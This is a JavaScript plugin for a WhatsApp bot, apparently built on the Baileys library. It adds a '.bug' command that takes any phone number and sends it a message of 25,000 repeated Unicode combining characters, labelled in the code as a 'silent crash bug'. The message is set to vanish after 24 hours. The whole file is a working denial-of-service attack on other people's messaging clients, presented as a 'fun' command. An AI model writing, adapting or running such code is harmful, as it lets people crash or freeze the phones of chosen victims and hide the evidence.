const { cmd } = require('../lib/command');
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

cmd({
  pattern: "bug",
  use: ".bug <number>",
  category: "fun",
  desc: "Send silent Unicode crash bug",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Provide a number!* (ex: .bug 9471xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  let uitext = "꧀".repeat(25000); // heavy invisible Unicode flood

  try {
    const bugMsg = await generateWAMessageFromContent(target, {
      conversation: uitext
    }, {
      quoted: null, // no reply
      ephemeralExpiration: 86400, // optional: delete after 24h
      messageId: undefined
    });

    await conn.relayMessage(target, bugMsg.message, { messageId: bugMsg.key.id });

    await reply("✅ Silent bug message sent to: " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Failed to send silent message.");
  }
});
